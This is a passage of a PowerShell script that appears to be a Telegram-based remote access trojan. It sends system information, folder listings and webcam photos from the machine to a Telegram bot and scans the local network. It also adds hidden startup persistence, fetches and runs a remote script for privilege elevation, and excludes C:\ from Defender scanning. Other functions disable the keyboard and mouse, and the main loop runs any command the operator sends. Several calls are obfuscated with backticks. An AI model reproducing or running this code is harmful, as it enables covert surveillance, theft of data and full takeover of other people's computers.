---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="

$outpath = "$env:TEMP/systeminfo.txt"
$contents | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
if ($OSString -like '*11*'){
    EnumNotepad
}
else{
    "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
}

Post-Message
Post-File
sleep 2
rm -Path $outpath -Force
}

Function Enumerate-LAN{
param ([string]$Prefix)
if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
$FileOut = "$env:temp\Computers.csv"
1..255 | ForEach-Object {
    $ipAddress = "$Prefix.$_"
    Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
    }
$Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
             ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
             Select-Object IPv4, MAC
$Computers | Export-Csv $FileOut -NoTypeInformation
$data = Import-Csv $FileOut
$data | ForEach-Object {
    $mac = $_.'MAC'
    $apiUrl = "https://api.macvendors.com/$mac"
    $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
    Start-Sleep -Seconds 1
    $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
    }
$data | Export-Csv $FileOut -NoTypeInformation
$data | ForEach-Object {
    try {
        $ip = $_.'IPv4'
        $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
    } 
    catch {
        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
    }
}
$data | Export-Csv $FileOut -NoTypeInformation
$results = Get-Content -Path $FileOut -Raw
Write-Output "$results"
rm -Path $FileOut
}

Function Folder-Tree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
tree $env:APPDATA /A /F | Out-File $env:temp/Appdata.txt
tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
$FilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $FilePath
sleep 1
Post-File ;rm -Path $FilePath -Force
Write-Output "Done."
}

Function Add-Persistance{
$newScriptPath = "$env:APPDATA\Microsoft\Windows\Templates\copy.ps1"
$scriptContent | Out-File -FilePath $newScriptPath -force
sleep 1
if ($newScriptPath.Length -lt 100){
    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
    sleep 1
    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
    }
$tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
$tobat | Out-File -FilePath $pth -Force
Write-Output "Persistance Added."
rm -path "$env:TEMP\temp.ps1" -Force
}

Function Remove-Persistance{
rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
rm -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
Write-Output "Uninstalled."
}

Function Pause-Session{
$contents = "$env:COMPUTERNAME $pause Session Paused. $pause (Re-Enter password to resume..)"
Post-Message | Out-Null
$script:AcceptedSession=""
}

Function Is-Admin{
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $contents = "$closed Current Session is NOT Admin $closed"
    Post-Message | Out-Null
    }
    else{
    $contents = "$tick Current Session IS Admin $tick"
    Post-Message | Out-Null
    }
}

Function Attempt-Elevate{
$tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
  WScript.Quit
End If
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
"@
$pth = "C:\Windows\Tasks\service.vbs"
$tobat | Out-File -FilePath $pth -Force
& $pth
Sleep 7
rm -Path $pth
Write-Output "Done."
}

Function Toggle-Errors{
If($global:errormsg -eq 0){
    $global:errormsg = 1
    $contents = "$tick Error Messaging ON $tick"
    Post-Message | Out-Null
    return
    }
If($global:errormsg -eq 1){
    $global:errormsg = 0
    $contents = "$closed Error Messaging OFF $closed"
    Post-Message | Out-Null
    return
    }
}

Function Message([string]$Message){
    msg.exe * $Message
    Write-Output "Done."
}

Function Take-Picture {
$dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
if (-not (Test-Path $dllPath)) {
    $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $dllPath)
}
Add-Type -Path $dllPath
[Webcam.webcam]::init()
[Webcam.webcam]::select(1)
$imageBytes = [Webcam.webcam]::GetImage()
$tempDir = [System.IO.Path]::GetTempPath()
$imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
[System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
    sleep 1
    curl.exe -F chat_id="$ChatID" -F document=@"$imagePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
    sleep 1
    Remove-Item -Path "$env:TEMP\webcam.dll"
    Remove-Item -Path $imagePath -Force
}

# ---------------------------------------- ADMIN ONLY FUNCTIONS --------------------------------------------------

Function Disable-AV{
    Add-MpPreference -ExclusionPath C:\
    Write-Output "Done."
}

Function Disable-HID{
    $contents = "$env:COMPUTERNAME $closed Disabling HID Inputs.."
    Post-Message | Out-Null
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Disable()
}

Function Enable-HID{
    $contents = "$env:COMPUTERNAME $tick Enabling HID Inputs.."
    Post-Message | Out-Null
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Enable()
}

# --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------

Function GetFfmpeg{
$contents = "$env:COMPUTERNAME $waiting Downloading FFmpeg to Client.."
Post-Message | Out-Null
$Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        $tempDir = "$env:temp"
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $response = Invoke-WebRequest -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" } -UseBasicParsing
        $release = $response.Content | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        Remove-Item -Path $zipFilePath -Force
        Remove-Item -Path $extractedDir -Recurse -Force
        $contents = "$env:COMPUTERNAME $tick Download Complete"
        Post-Message | Out-Null
    }
    else {
        $contents = "$env:COMPUTERNAME $tick Already Downloaded"
        Post-Message | Out-Null
    }
}

# Posting Functions
Function Post-Message{$script:params = @{chat_id = $ChatID ;text = $contents};Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params}
Function Post-File{curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null}

Function ShowButtons{
$messagehead = "Press a Button to Continue..."
$inlineKeyboardJson = '{"inline_keyboard":[[{"text": "Enter Commands","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
$paramers = @{chat_id = $chatId ;text = $messagehead ;reply_markup = $inlineKeyboardJson}
Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
$killint = 0
$offset = 0
while ($killint -eq 0) {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
    foreach ($update in $updates.result) {
        $offset = $update.update_id + 1
        Sleep 1
        if ($update.callback_query.data -eq "button_clicked") {$killint = 1}
        if ($update.callback_query.data -eq "button2_clicked") {$killint = 1;Options}
        }
    Sleep 1
    }
$contents = "$comp $env:COMPUTERNAME $tick Session Started"
Post-Message
}

# Session Authentication
Function IsAuth{ 
param($CheckMessage)
    if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
        $script:AcceptedSession="Authenticated"
        $contents = "$comp $env:COMPUTERNAME $tick Session Starting..."
        Post-Message
        ShowButtons
        return $messages.message.chat.id
    }Else{return 0}
}

# format long strings
Function CleanString{
param($Stream)
$FixedResult=@()
$Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgc2.txt") -Force
$ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgc2.txt") | where {$_.length -gt 0}
    foreach ($line in $ReadAsArray){
    $ArrObj=New-Object psobject
    $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
    $FixedResult +=$ArrObj
    }
return $FixedResult
}

# Message Interpretation
Function SendMSG{
param($Messagetext,$ChatID)
$FixedText=CleanString -Stream $Messagetext
$Mts | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
$JsonData=($Mts | ConvertTo-Json)
irm -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
$catcher = $FixedText
}

Function ReceiveMSG{
try{
    $inMessage=irm -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
    return $inMessage.result[-1]
    }
Catch{return "Telegram C2 Failed"}
}

#-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------

# Message 'waiting for passphrase'
$contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
Post-Message

# Start the main wait loop.
While ($true){
Sleep 2
$messages=ReceiveMSG
    if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
    if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
    Else{
        if (($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $lastexecMessageID)){
            try{
                $Result=ie`x($messages.message.text) -ErrorAction Stop
                $Result
                if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration")){}
                else{
                SendMSG -Messagetext $Result -ChatID $messages.message.chat.id
                }
                }catch {
                    if($global:errormsg -eq 1){
                    SendMSG -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id
                    }
                }
            Finally{$lastexecMessageID=$messages.message.date}
        }
    }
}
